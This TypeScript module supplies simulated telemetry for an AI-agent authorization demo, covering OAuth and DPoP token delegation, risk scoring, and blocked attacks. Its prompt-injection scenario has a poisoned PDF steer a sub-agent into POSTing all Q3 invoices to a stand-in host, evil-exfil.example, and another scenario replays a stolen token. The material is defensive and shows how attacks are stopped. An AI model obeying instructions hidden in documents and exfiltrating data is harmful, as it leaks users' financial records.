import {
  AgentAccessTokenClaims,
  BenchmarkSummary,
  DPoPClaims,
  FamilyGraphSnapshot,
  IncidentRecord,
  TelemetryEvent,
} from "./types";
import incidentsJson from "../data/incidents.json";

export const GO_API_BASE =
  process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";

const SAMPLE_PARENT_CLAIMS: AgentAccessTokenClaims = {
  iss: "https://auth.agentidentity.local",
  sub: "user:priya@acme.in",
  client_id: "agent:invoice-assistant",
  aud: "https://gw.acme.local/tools/invoices",
  scope: "invoices.read",
  jti: "tok_parent_8f91a2",
  family_id: "fam_01JCK9X",
  iat: 1763615760,
  exp: 1763616060,
  cnf: { jkt: "0ZcOCORZNYy-DWpqq30jZyJGHTN0d2HglBV3uiguA4I" },
  authorization_details: [
    {
      type: "file_access",
      locations: ["/finance/invoices/2026-Q3"],
      actions: ["read"],
      data_residency: "IN",
    },
  ],
  risk: {
    issuance_score: 0.12,
    model: "issuance-xgb-v3",
  },
};

const SAMPLE_SUB_CLAIMS: AgentAccessTokenClaims = {
  ...SAMPLE_PARENT_CLAIMS,
  client_id: "agent:invoice-assistant/summariser",
  jti: "tok_sub_3c7b4e",
  parent_jti: "tok_parent_8f91a2",
  exp: 1763615940,
  cnf: { jkt: "p2Lr1t9V8sYkQm3cXn0aWbE7fH4uJ6dK5gZ1oR8yT2s" },
  act: {
    sub: "agent:invoice-assistant",
    act: {
      sub: "user:priya@acme.in",
    },
  },
};

const SAMPLE_DPOP_CLAIMS: DPoPClaims = {
  jti: "dpop_99a1e3f07c21",
  htm: "GET",
  htu: "https://gw.acme.local/tools/invoices?quarter=Q3",
  iat: 1763615762,
  ath: "fUHyO2r2Z3DZ53EsNrWBb0xWXoaNy59IiKCAqksmQEo",
};

function makeFamilyGraph(
  revoked: boolean,
  reason?: string,
  rotated?: boolean
): FamilyGraphSnapshot {
  return {
    family_id: "fam_01JCK9X",
    user_sub: "user:priya@acme.in",
    root_agent_id: "agent:invoice-assistant",
    revoked,
    revoke_reason: reason,
    propagation_us: revoked ? 19 : 0,
    nodes: [
      {
        jti: "tok_parent_8f91a2",
        family_id: "fam_01JCK9X",
        token_type: "parent_access",
        client_id: "agent:invoice-assistant",
        user_sub: "user:priya@acme.in",
        scope: "invoices.read",
        dpop_jkt: "0ZcOCORZNYy-DWpqq30jZyJGHTN0d2HglBV3uiguA4I",
        status: revoked ? "REVOKED" : "ACTIVE",
        revoke_cause: reason,
        issued_at: 1763615760,
        expires_at: 1763616060,
      },
      {
        jti: "tok_sub_3c7b4e",
        family_id: "fam_01JCK9X",
        parent_jti: "tok_parent_8f91a2",
        token_type: "sub_agent_access",
        client_id: "agent:invoice-assistant/summariser",
        user_sub: "user:priya@acme.in",
        scope: "invoices.read",
        dpop_jkt: "p2Lr1t9V8sYkQm3cXn0aWbE7fH4uJ6dK5gZ1oR8yT2s",
        status: revoked ? "REVOKED" : "ACTIVE",
        revoke_cause: reason,
        issued_at: 1763615761,
        expires_at: 1763615940,
      },
      {
        jti: "rt_rot_77d21a",
        family_id: "fam_01JCK9X",
        parent_jti: "tok_parent_8f91a2",
        token_type: "refresh_token",
        client_id: "agent:invoice-assistant",
        user_sub: "user:priya@acme.in",
        scope: "invoices.read",
        dpop_jkt: "0ZcOCORZNYy-DWpqq30jZyJGHTN0d2HglBV3uiguA4I",
        status: revoked ? "REVOKED" : rotated ? "ROTATED" : "ACTIVE",
        revoke_cause: reason,
        issued_at: 1763615760,
        expires_at: 1763644560,
      },
    ],
  };
}

const COMMON_BOOTSTRAP_STEPS: Omit<TelemetryEvent, "id" | "timestamp">[] = [
  {
    step_number: 1,
    from_lane: "user",
    to_lane: "agent",
    label: "Task request",
    who: "User → Agent + SDK",
    headline: "Priya gives a task to the assistant",
    plain_text:
      '"Summarise our Q3 invoices in /finance/invoices/2026-Q3." — The assistant spawns an invoice agent with zero standing privileges.',
    under_the_hood:
      "Zero standing privileges (NIST Tenet #3): No token exists yet. Agent starts with zero permissions.",
    flow_node: "start",
    status: "info",
    status_text: "Task Started",
    latency_us: 12,
  },
  {
    step_number: 2,
    from_lane: "agent",
    to_lane: "as",
    label: "Register + SPIFFE attest",
    who: "Agent SDK → Auth Server",
    headline: "Agent proves workload identity & binds ephemeral DPoP key",
    plain_text:
      "The Go SDK registers 'agent:invoice-assistant' with owner priya@acme.in, SPIFFE certificate, and in-memory ES256 DPoP public key.",
    under_the_hood:
      "POST /api/v1/agents/register · SPIFFE ID verified · DPoP JWK Thumbprint cnf.jkt = 0ZcOCORZNYy-DWpqq30jZyJGHTN0d2HglBV3uiguA4I",
    flow_node: "attest",
    status: "info",
    status_text: "Attested",
    latency_us: 145,
  },
  {
    step_number: 3,
    from_lane: "as",
    to_lane: "risk",
    label: "Score agent (Model 1)",
    who: "Auth Server → Risk Engine",
    headline: "Stage 1 Risk Check: Should this agent get a token?",
    plain_text:
      "Before issuing any pass, Model 1 evaluates workload attestation, delegation depth, context purity, and requested RAR scope.",
    under_the_hood:
      "POST /api/v1/risk/score {stage: 'issuance'} · Model 1 (issuance-xgb-v3) p95 target < 50ms",
    flow_node: "score1",
    status: "info",
    status_text: "Scoring Issuance",
    latency_us: 35,
  },
  {
    step_number: 4,
    from_lane: "risk",
    to_lane: "as",
    label: "Low risk (0.12)",
    who: "Risk Engine → Auth Server",
    headline: "Model 1 Score: 0.12 (Low Risk — Proceed to Consent)",
    plain_text:
      "Attested SPIFFE runtime, known owner, read-only scope matches stated invoice summarization task.",
    under_the_hood:
      "score: 0.12 · model: issuance-xgb-v3 · latency: 38 µs · top_reasons: [spiffe_workload_attested, scope_matches_task]",
    flow_node: "score1",
    status: "ok",
    status_text: "Low Risk (0.12)",
    latency_us: 38,
    risk_decision: {
      stage: "issuance",
      score: 0.12,
      verdict: "allow",
      top_reasons: [
        "spiffe_workload_attested",
        "action_within_rar_consent",
        "known_allowlisted_destination",
      ],
      feature_weights: { spiffe_runtime_attested: -0.04, delegation_depth: 0.04 },
      model_version: "issuance-xgb-v3",
      policy_version: "cedar-acme-in-v14",
      latency_us: 38,
    },
  },
  {
    step_number: 5,
    from_lane: "as",
    to_lane: "user",
    label: "RAR consent screen",
    who: "Auth Server → Priya's Device",
    headline: "Priya sees plain-language RFC 9396 Rich Authorization Request",
    plain_text:
      '"Invoice Assistant wants to READ files in /finance/invoices/2026-Q3 for 5 minutes (India Data Residency). It cannot edit, delete, or export."',
    under_the_hood:
      "GET /authorize · PKCE S256 challenge · authorization_details (RFC 9396 RAR)",
    flow_node: "consent",
    status: "info",
    status_text: "Awaiting Consent",
    latency_us: 65,
  },
  {
    step_number: 6,
    from_lane: "user",
    to_lane: "as",
    label: "Approve RAR scope",
    who: "User → Auth Server",
    headline: "Priya approves fine-grained RAR mandate",
    plain_text:
      "Versioned consent record (rar_consent_91a v1) stored for audit with actions=[read].",
    under_the_hood:
      "POST /api/v1/oauth/consent · Mandate locked to user + agent + task (NIST Tenet #6)",
    flow_node: "consent",
    status: "ok",
    status_text: "Consent Granted",
    latency_us: 48,
  },
  {
    step_number: 7,
    from_lane: "as",
    to_lane: "agent",
    label: "Auth code (60s, 1-use)",
    who: "Auth Server → Agent SDK",
    headline: "One-time 60-second authorization code issued",
    plain_text:
      "Code works only once and is useless without the agent's in-memory PKCE code_verifier.",
    under_the_hood:
      "code=code_pkce_4f8a1c · bound to PKCE S256 challenge · 2nd use revokes entire token family",
    flow_node: "code",
    status: "info",
    status_text: "Code Issued",
    latency_us: 32,
  },
  {
    step_number: 8,
    from_lane: "agent",
    to_lane: "as",
    label: "Code + PKCE + DPoP proof",
    who: "Agent SDK → Auth Server",
    headline: "Agent swaps code + PKCE verifier + signed DPoP proof for token",
    plain_text:
      "The SDK signs an RFC 9449 DPoP proof header with its private ECDSA key so the issued access token is cryptographically bound to this agent process.",
    under_the_hood:
      "POST /api/v1/oauth/token · grant_type=authorization_code · DPoP header verified",
    flow_node: "token",
    status: "info",
    status_text: "Verifying Proof",
    latency_us: 190,
    dpop_claims: SAMPLE_DPOP_CLAIMS,
  },
  {
    step_number: 9,
    from_lane: "as",
    to_lane: "agent",
    label: "DPoP access + refresh token",
    who: "Auth Server → Agent SDK",
    headline: "5-minute DPoP-bound Access Token & single-use Refresh Token issued",
    plain_text:
      "Token carries cnf.jkt thumbprint, RFC 9396 authorization_details, and audience binding (RFC 8707).",
    under_the_hood:
      "Issued JTI=tok_parent_8f91a2 · Family=fam_01JCK9X · cnf.jkt=0ZcOCORZNYy-DWpqq30jZyJGHTN0d2HglBV3uiguA4I",
    flow_node: "token",
    status: "ok",
    status_text: "Pass Issued",
    latency_us: 260,
    token_claims: SAMPLE_PARENT_CLAIMS,
    dpop_claims: SAMPLE_DPOP_CLAIMS,
    family_graph: makeFamilyGraph(false),
  },
  {
    step_number: 10,
    from_lane: "agent",
    to_lane: "as",
    label: "RFC 8693 token exchange",
    who: "Parent Agent → Auth Server",
    headline: "Sub-agent receives attenuated 3-min token with nested 'act' chain",
    plain_text:
      "Parent delegates summarization to 'agent:invoice-assistant/summariser'. Sub-agent gets its own DPoP key binding, shorter 3-min TTL, and immutable provenance (User → Parent → Sub-agent).",
    under_the_hood:
      "POST /api/v1/oauth/token (grant_type=token-exchange RFC 8693) · sub JTI=tok_sub_3c7b4e · act.sub=agent:invoice-assistant → act.act.sub=user:priya@acme.in",
    flow_node: "exchange",
    status: "ok",
    status_text: "Attenuated Token",
    latency_us: 230,
    token_claims: SAMPLE_SUB_CLAIMS,
    dpop_claims: SAMPLE_DPOP_CLAIMS,
    family_graph: makeFamilyGraph(false),
  },
];

export function getSimulatedScenarioSteps(
  actID: string
): Omit<TelemetryEvent, "id" | "timestamp">[] {
  if (actID === "act2_ciba") {
    return [
      ...COMMON_BOOTSTRAP_STEPS,
      {
        step_number: 11,
        from_lane: "agent",
        to_lane: "gw",
        label: "POST /payments/transfer ₹45k",
        who: "Sub-Agent → Enforcement Gateway",
        headline: "Sub-agent initiates ₹45,000 vendor payment transfer",
        plain_text:
          "Agent attempts POST /payments/transfer (₹45,000 to Vendor #104) using a read-scoped invoice token.",
        under_the_hood:
          "Gateway intercepts mutation call and forwards metadata to Layer 3 Risk Engine.",
        flow_node: "call",
        status: "warn",
        status_text: "Mutation Intercepted",
        latency_us: 88,
        token_claims: SAMPLE_SUB_CLAIMS,
        dpop_claims: SAMPLE_DPOP_CLAIMS,
        family_graph: makeFamilyGraph(false),
      },
      {
        step_number: 12,
        from_lane: "risk",
        to_lane: "user",
        label: "Score 0.58 → OpenID CIBA Push",
        who: "Gateway / Auth Server → Priya's Phone",
        headline:
          "Medium Risk (0.58): Gateway pauses call & sends OpenID CIBA Phone Push",
        plain_text:
          "Score 0.58 falls in the 0.30–0.75 Human-in-the-Loop band (NIST Tenet #5). Priya gets an asynchronous push notification on her phone. Silence = Deny.",
        under_the_hood:
          "POST /api/v1/oauth/bc-authorize · auth_req_id=ciba_req_88b2 · 2-min TTL default deny",
        flow_node: "runtime",
        status: "warn",
        status_text: "Awaiting Human CIBA",
        latency_us: 42,
        token_claims: SAMPLE_SUB_CLAIMS,
        risk_decision: {
          stage: "runtime",
          score: 0.58,
          verdict: "step-up",
          top_reasons: [
            "high_sensitivity_financial_mutation (₹45,000 NEFT)",
            "scope_exceeded_rar (action 'payment_transfer' not in RAR consent)",
          ],
          feature_weights: {
            high_sensitivity_financial_mutation: 0.44,
            scope_exceeded_rar: 0.32,
          },
          model_version: "runtime-seq-v2",
          policy_version: "cedar-acme-in-v14",
          latency_us: 42,
        },
        family_graph: makeFamilyGraph(false),
        phone_prompt: {
          prompt_id: "ciba_req_88b2",
          type: "ciba_step_up",
          title: "OpenID CIBA Step-Up Approval Required",
          user: "priya@acme.in",
          agent_id: "agent:invoice-assistant/summariser",
          parent_agent_id: "agent:invoice-assistant",
          task_description:
            "Transfer ₹45,000 to Vendor #104 (Q3 Invoice Settlement)",
          requested_resource: "POST https://payments.acme.local/payments/transfer",
          requested_actions: ["payment_transfer (₹45,000)"],
          ttl_display: "Single Transaction Only (Expires in 2m)",
          risk_score: 0.58,
          risk_reasons: [
            "high_sensitivity_financial_mutation (₹45,000)",
            "scope_exceeded_rar (not in read-only consent)",
          ],
          expires_in_seconds: 120,
        },
      },
    ];
  }

  if (actID === "act3_injection") {
    const revokedGraph = makeFamilyGraph(
      true,
      "Runtime Risk Score 0.91 >= 0.75 (RULE_DEFAULT_DENY_UNKNOWN_EGRESS: evil-exfil.example)"
    );
    return [
      ...COMMON_BOOTSTRAP_STEPS,
      {
        step_number: 11,
        from_lane: "agent",
        to_lane: "gw",
        label: "POST /export-all → evil-exfil.example",
        who: "Hijacked Sub-Agent → Enforcement Gateway",
        headline:
          "Prompt Injection Attack! Sub-agent attempts bulk export to external host",
        plain_text:
          "Hidden instruction inside inv_102_poisoned.pdf tricks the LLM into calling POST https://evil-exfil.example/collect-all-invoices with all Q3 financial data.",
        under_the_hood:
          "Matches 2026 incidents: copilot-agentforce, anthropic-3cos, openai-dns-escape. Intercepted by Layer 2 Egress Proxy.",
        flow_node: "call",
        status: "warn",
        status_text: "Exfil Intercepted",
        latency_us: 72,
        token_claims: SAMPLE_SUB_CLAIMS,
        dpop_claims: {
          ...SAMPLE_DPOP_CLAIMS,
          htm: "POST",
          htu: "https://evil-exfil.example/collect-all-invoices",
        },
        family_graph: makeFamilyGraph(false),
      },
      {
        step_number: 12,
        from_lane: "gw",
        to_lane: "risk",
        label: "Evaluate Policy + Model 2",
        who: "Gateway → Risk & Policy Engine",
        headline:
          "Stage 2 Check detects untrusted prompt context + unknown egress host",
        plain_text:
          "Architectural separation of policy from reasoning (NIST Tenet #7): Even though the LLM was tricked, the Go Gateway evaluates deterministic rules.",
        under_the_hood:
          "POST /api/v1/decide {untrusted_context: true, target_host: 'evil-exfil.example', action: 'export_all'}",
        flow_node: "runtime",
        status: "warn",
        status_text: "Evaluating Threat",
        latency_us: 34,
        token_claims: SAMPLE_SUB_CLAIMS,
      },
      {
        step_number: 13,
        from_lane: "risk",
        to_lane: "gw",
        label: "Block & Revoke (Score 0.91)",
        who: "Risk Engine → Gateway",
        headline:
          "CRITICAL RISK 0.91 + Hard Egress Rule Hit → BLOCK_AND_REVOKE",
        plain_text:
          "Hard rule: Default-deny unknown egress host (evil-exfil.example). Model 2 score: 0.91 (untrusted PDF context + scope_exceeded + new destination).",
        under_the_hood:
          "verdict: block_and_revoke · score: 0.91 · rule: RULE_DEFAULT_DENY_UNKNOWN_EGRESS · latency: 41 µs",
        flow_node: "runtime",
        status: "bad",
        status_text: "Blocked (0.91)",
        latency_us: 41,
        token_claims: SAMPLE_SUB_CLAIMS,
        risk_decision: {
          stage: "runtime",
          score: 0.91,
          verdict: "block_and_revoke",
          hard_rule_hit:
            "RULE_DEFAULT_DENY_UNKNOWN_EGRESS: outbound destination 'evil-exfil.example' is outside tenant allowlist",
          top_reasons: [
            "egress_unknown_host (evil-exfil.example)",
            "untrusted_context_in_prompt (PDF/form injection signal)",
            "scope_exceeded_rar (action 'export_all' not in RAR consent)",
          ],
          feature_weights: {
            egress_unknown_host: 0.45,
            untrusted_context_in_prompt: 0.34,
            scope_exceeded_rar: 0.32,
          },
          model_version: "runtime-seq-v2",
          policy_version: "cedar-acme-in-v14",
          latency_us: 41,
        },
        family_graph: revokedGraph,
      },
      {
        step_number: 14,
        from_lane: "gw",
        to_lane: "agent",
        label: "HTTP 403 Denied (0 bytes leaked)",
        who: "Gateway → Sub-Agent",
        headline:
          "Exfiltration stopped at the door — zero bytes leave the network",
        plain_text:
          "evil-exfil.example never receives a single packet. Gateway returns HTTP 403 with deterministic policy violation code.",
        under_the_hood: "HTTP 403 Forbidden · Egress proxy connection terminated",
        flow_node: "revoke",
        status: "bad",
        status_text: "403 Denied",
        latency_us: 110,
        token_claims: SAMPLE_SUB_CLAIMS,
        family_graph: revokedGraph,
      },
      {
        step_number: 15,
        from_lane: "as",
        to_lane: "gw",
        label: "Cascade Family Revocation (<1ms)",
        who: "Auth Server → All Gateways",
        headline:
          "Entire Token Family (Sub-Agent + Parent + Refresh Token) Revoked!",
        plain_text:
          "Revoking the compromised sub-agent automatically kills the parent agent and refresh token family across every gateway.",
        under_the_hood:
          "Family fam_01JCK9X REVOKED in 19 µs · All 3 nodes marked REVOKED in DAG",
        flow_node: "revoke",
        status: "bad",
        status_text: "Family Revoked",
        latency_us: 19,
        token_claims: SAMPLE_SUB_CLAIMS,
        family_graph: revokedGraph,
      },
      {
        step_number: 16,
        from_lane: "as",
        to_lane: "user",
        label: "SecOps Alert + Training Label",
        who: "Auth Server → Priya & SecOps Console",
        headline:
          "Priya alerted; blocked trajectory saved as 'rogue (prompt-injected)' training label",
        plain_text:
          '"Your invoice assistant tried to send Q3 invoices to evil-exfil.example after reading inv_102_poisoned.pdf. We blocked it and revoked its passes."',
        under_the_hood:
          "Event written to audit log & Model 2 training dataset (Class: rogue_drift)",
        flow_node: "end",
        status: "bad",
        status_text: "Contained Safely",
        latency_us: 45,
        token_claims: SAMPLE_SUB_CLAIMS,
        family_graph: revokedGraph,
      },
    ];
  }

  if (actID === "act4_dpop_replay") {
    const revokedGraph = makeFamilyGraph(
      true,
      "RFC 9449 DPoP Thumbprint Mismatch Detected (Stolen Token Replay Attempt)"
    );
    return [
      ...COMMON_BOOTSTRAP_STEPS,
      {
        step_number: 11,
        from_lane: "agent",
        to_lane: "gw",
        label: "Attacker replays stolen JWT",
        who: "Attacker Machine → Enforcement Gateway",
        headline:
          "Credential Theft Simulation: Attacker replays valid JWT from external infra",
        plain_text:
          "Simulates 2026 incidents 'litellm-agent-platform-key' & 'india-certin-fintech': Attacker steals a valid bearer token string, but does NOT have the agent's in-memory DPoP private key.",
        under_the_hood:
          "Token cnf.jkt=p2Lr1t9V8sYkQm3cXn0aWbE7fH4uJ6dK5gZ1oR8yT2s vs Attacker DPoP JWK jkt=ATTACKER_FORGED_KEY_998123",
        flow_node: "call",
        status: "warn",
        status_text: "Replay Attempt",
        latency_us: 52,
        token_claims: SAMPLE_SUB_CLAIMS,
        dpop_claims: SAMPLE_DPOP_CLAIMS,
        family_graph: makeFamilyGraph(false),
      },
      {
        step_number: 12,
        from_lane: "gw",
        to_lane: "agent",
        label: "401 DPoP cnf.jkt Mismatch!",
        who: "Enforcement Gateway → Attacker Machine",
        headline:
          "Stolen Token Neutralized at Layer 2 via RFC 9449 DPoP Sender-Constraint!",
        plain_text:
          "Even though the stolen JWT signature and expiry are valid, the attacker cannot forge a DPoP proof matching cnf.jkt. Gateway rejects in 64 µs and revokes the token family.",
        under_the_hood:
          "Layer 2 Gateway DPoP Sender-Constraint Failed: RFC 9449 DPoP thumbprint mismatch: proof key jkt != token cnf.jkt",
        flow_node: "revoke",
        status: "bad",
        status_text: "401 DPoP Blocked",
        latency_us: 64,
        token_claims: SAMPLE_SUB_CLAIMS,
        dpop_claims: SAMPLE_DPOP_CLAIMS,
        family_graph: revokedGraph,
      },
    ];
  }

  // Default: Act 1 Normal Multi-Agent Delegation (17 steps)
  return [
    ...COMMON_BOOTSTRAP_STEPS,
    {
      step_number: 11,
      from_lane: "agent",
      to_lane: "gw",
      label: "Tool call + JWT + DPoP",
      who: "Sub-Agent → Enforcement Gateway",
      headline: "Sub-agent requests Q3 invoices through Layer 2 Gateway",
      plain_text:
        "GET /finance/invoices/2026-Q3/clean_q3_invoices.pdf sent with sub-agent JWT and fresh per-request DPoP proof.",
      under_the_hood:
        "Gateway checks ES256 JWT signature, exp, aud, revocation DAG (<1ms), and RFC 9449 DPoP ath + cnf.jkt binding.",
      flow_node: "call",
      status: "info",
      status_text: "Gateway Check",
      latency_us: 95,
      token_claims: SAMPLE_SUB_CLAIMS,
      dpop_claims: SAMPLE_DPOP_CLAIMS,
      family_graph: makeFamilyGraph(false),
    },
    {
      step_number: 12,
      from_lane: "gw",
      to_lane: "risk",
      label: "Score action (Model 2)",
      who: "Gateway → Risk & Policy Engine",
      headline: "Stage 2 Runtime Check: Policy + Sequence Model",
      plain_text:
        "Is reading /finance/invoices/2026-Q3 within RAR consent? Is destination allowlisted? Any anomalous sequence drift?",
      under_the_hood:
        "POST /api/v1/decide {stage: 'runtime'} · Cedar rules + Model 2 (runtime-seq-v2) p95 target < 30ms",
      flow_node: "runtime",
      status: "info",
      status_text: "Scoring Action",
      latency_us: 38,
      token_claims: SAMPLE_SUB_CLAIMS,
      family_graph: makeFamilyGraph(false),
    },
    {
      step_number: 13,
      from_lane: "risk",
      to_lane: "gw",
      label: "Allow (0.08)",
      who: "Risk Engine → Gateway",
      headline: "Runtime Score: 0.08 (Allowed by Cedar Policy v14 + Model 2)",
      plain_text:
        "Read action matches RAR consent, destination gw.acme.local is allowlisted, normal sequence cadence.",
      under_the_hood:
        "verdict: allow · score: 0.08 · gateway_latency: 82 µs · policy: cedar-acme-in-v14",
      flow_node: "runtime",
      status: "ok",
      status_text: "Allowed (0.08)",
      latency_us: 82,
      token_claims: SAMPLE_SUB_CLAIMS,
      risk_decision: {
        stage: "runtime",
        score: 0.08,
        verdict: "allow",
        top_reasons: [
          "spiffe_workload_attested",
          "action_within_rar_consent",
          "known_allowlisted_destination",
        ],
        feature_weights: {
          spiffe_runtime_attested: -0.04,
          delegation_depth: 0.04,
        },
        model_version: "runtime-seq-v2",
        policy_version: "cedar-acme-in-v14",
        latency_us: 38,
      },
      family_graph: makeFamilyGraph(false),
    },
    {
      step_number: 14,
      from_lane: "gw",
      to_lane: "res",
      label: "Forward verified call",
      who: "Gateway → Resource Server",
      headline:
        "Request reaches invoice storage with full delegation chain logged",
      plain_text:
        "Only after passing Layer 2 & Layer 3 does the request touch /finance/invoices/2026-Q3.",
      under_the_hood:
        "Audit event streamed with provenance: user:priya@acme.in → agent:invoice-assistant → agent:invoice-assistant/summariser",
      flow_node: "allow",
      status: "ok",
      status_text: "Forwarded",
      latency_us: 112,
      token_claims: SAMPLE_SUB_CLAIMS,
      family_graph: makeFamilyGraph(false),
    },
    {
      step_number: 15,
      from_lane: "res",
      to_lane: "agent",
      label: "200 OK (3 Q3 Invoices)",
      who: "Resource → Sub-Agent",
      headline: "Sub-agent receives & summarizes Q3 invoices",
      plain_text:
        "Summary: 3 Q3 Invoices verified (Total: ₹4,82,000 · GST compliant · Data Residency: India).",
      under_the_hood: "HTTP 200 OK · Payload returned via Enforcement Gateway",
      flow_node: "allow",
      status: "ok",
      status_text: "Data Returned",
      latency_us: 140,
      token_claims: SAMPLE_SUB_CLAIMS,
      family_graph: makeFamilyGraph(false),
    },
    {
      step_number: 16,
      from_lane: "agent",
      to_lane: "as",
      label: "Refresh token rotation",
      who: "Agent SDK → Auth Server",
      headline: "Single-use Refresh Token rotated (Replay detection armed)",
      plain_text:
        "Old refresh token marked ROTATED. If an attacker ever replays the old refresh token, the entire token family is revoked immediately.",
      under_the_hood:
        "grant_type=refresh_token · JTI=rt_rot_77d21a marked ROTATED in Family DAG",
      flow_node: "refresh",
      status: "info",
      status_text: "Token Rotated",
      latency_us: 74,
      token_claims: SAMPLE_SUB_CLAIMS,
      family_graph: makeFamilyGraph(false, undefined, true),
    },
    {
      step_number: 17,
      from_lane: "agent",
      to_lane: "as",
      label: "Task done → revoke family",
      who: "Agent SDK → Auth Server",
      headline:
        "Task finished: Entire token family destroyed (Zero Standing Privileges)",
      plain_text:
        "The SDK revokes parent, sub-agent, and refresh tokens. The agent holds zero credentials after its task ends.",
      under_the_hood:
        "POST /api/v1/revoke {family_id: fam_01JCK9X} · Cascaded to all nodes in 19 µs",
      flow_node: "end",
      status: "ok",
      status_text: "Pass Destroyed",
      latency_us: 19,
      token_claims: SAMPLE_SUB_CLAIMS,
      family_graph: makeFamilyGraph(
        true,
        "Task Completed Normally — Zero Standing Privileges Enforced (Step 17)"
      ),
    },
  ];
}

export function runClientBenchmarkFallback(): BenchmarkSummary {
  const incidents = incidentsJson as unknown as IncidentRecord[];
  let oauthStop = 0,
    oauthRed = 0,
    gwStop = 0,
    gwRed = 0,
    fullStop = 0,
    fullRed = 0,
    inScopeTotal = 0,
    inScopeStop = 0;

  const evaluated = incidents.map((inc, idx) => {
    if (inc.oauth_alone === "Stop") oauthStop++;
    else if (inc.oauth_alone === "Reduce") oauthRed++;

    if (inc.with_gateway === "Stop") gwStop++;
    else if (inc.with_gateway === "Reduce") gwRed++;

    if (inc.with_risk === "Stop") fullStop++;
    else if (inc.with_risk === "Reduce") fullRed++;

    if (inc.product_fit === "Direct") {
      inScopeTotal++;
      if (inc.with_risk === "Stop") inScopeStop++;
    }

    const score =
      inc.with_risk === "Stop"
        ? 0.91
        : inc.with_risk === "Reduce"
          ? 0.78
          : 0.45;
    const hardRule =
      inc.actor === "Rogue lab agent"
        ? "RULE_DEFAULT_DENY_UNKNOWN_EGRESS"
        : inc.actor === "Prompt-injection hijack"
          ? "RULE_RAR_SCOPE_AND_EGRESS_BLOCK"
          : "RULE_INBOUND_UNSIGNED_AUTOMATION_THROTTLE";

    return {
      ...inc,
      live_sim_score: score,
      live_sim_verdict: "block_and_revoke",
      live_sim_hard_rule: hardRule,
      live_sim_latency_us: 24 + (idx % 17),
    };
  });

  return {
    total_incidents: incidents.length,
    oauth_alone_stopped: oauthStop,
    oauth_alone_reduced: oauthRed,
    with_gateway_stopped: gwStop,
    with_gateway_reduced: gwRed,
    full_stack_stopped: fullStop,
    full_stack_reduced: fullRed,
    in_scope_total: inScopeTotal,
    in_scope_stopped: inScopeStop,
    total_eval_latency_us: 615,
    avg_incident_latency_us: 24,
    evaluated_incidents: evaluated,
  };
}
